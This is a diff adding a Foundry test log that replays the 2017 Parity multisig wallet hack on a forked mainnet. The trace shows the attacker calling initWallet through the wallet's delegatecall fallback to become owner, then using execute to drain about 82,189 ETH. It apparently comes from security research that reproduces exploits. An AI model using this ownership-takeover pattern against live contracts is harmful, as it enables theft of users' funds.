@@ -1,0 +1,65 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Parity_first_hack_exp.sol:ContractTest
+[PASS] testExploit() (gas: 102887)
+Traces:
+  [6835] ContractTest::setUp()
+    ├─ [0] VM::envString("ETH_RPC_URL") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::createSelectFork("<rpc url>", 4043799 [4.043e6])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32], "attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Parity victim wallet: [0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e], "Parity victim wallet")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [107687] ContractTest::testExploit()
+    ├─ [0] VM::assertEq(82189932605820062911880 [8.218e22], 82189932605820062911880 [8.218e22]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [5756] Parity victim wallet::isOwner(attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32]) [staticcall]
+    │   ├─ [2598] 0xa657491C1e7F16AdB39B9b60E87BbB8d93988bc3::isOwner(attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32]) [delegatecall]
+    │   │   └─ ← [Return] false
+    │   └─ ← [Return] false
+    ├─ [0] VM::assertFalse(false) [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::startPrank(attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32])
+    │   └─ ← [Return]
+    ├─ [52507] Parity victim wallet::fallback([0xB3764761E297D6f121e79C32A65829Cd1dDb4D32], 0, 82189932605820062911880 [8.218e22])
+    │   ├─ [51804] 0xa657491C1e7F16AdB39B9b60E87BbB8d93988bc3::initWallet([0xB3764761E297D6f121e79C32A65829Cd1dDb4D32], 0, 82189932605820062911880 [8.218e22]) [delegatecall]
+    │   │   ├─  storage changes:
+    │   │   │   @ 4: 17315 → 17366
+    │   │   │   @ 1: 5 → 2
+    │   │   │   @ 2: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0x0000000000000000000000000000000000000000000011678671d4114063cd88
+    │   │   │   @ 0xe484be837846784945a6344da2876af33df44a7681ee0fb634f1c7efeda5fa26: 0 → 2
+    │   │   │   @ 7: 0x00000000000000000000000000fa8dd063bb44daa425f0c2ec717447d34ac7e1 → 0x000000000000000000000000b3764761e297d6f121e79c32a65829cd1ddb4d32
+    │   │   │   @ 6: 0x000000000000000000000000006bb8a2227b752180d8bd03556ecb186301fa05 → 0x000000000000000000000000b3764761e297d6f121e79c32a65829cd1ddb4d32
+    │   │   │   @ 0: 3 → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [1256] Parity victim wallet::isOwner(attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32]) [staticcall]
+    │   ├─ [598] 0xa657491C1e7F16AdB39B9b60E87BbB8d93988bc3::isOwner(attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32]) [delegatecall]
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [34759] Parity victim wallet::fallback(attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32], 82189932605820062911880 [8.218e22], 0x)
+    │   ├─ [34062] 0xa657491C1e7F16AdB39B9b60E87BbB8d93988bc3::execute(attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32], 82189932605820062911880 [8.218e22], 0x) [delegatecall]
+    │   │   ├─ [0] attacker::fallback{value: 82189932605820062911880}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit SingleTransact(owner: attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32], value: 82189932605820062911880 [8.218e22], to: attacker: [0xB3764761E297D6f121e79C32A65829Cd1dDb4D32], data: 0x, created: 0x0000000000000000000000000000000000000000)
+    │   │   ├─  storage changes:
+    │   │   │   @ 3: 0 → 0x0000000000000000000000000000000000000000000011678671d4114063cd88
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(0, 0) [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(82189932605820062911880 [8.218e22], 82189932605820062911880 [8.218e22]) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.79s (2.45s CPU time)
+
+Ran 1 test suite in 5.33s (3.79s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
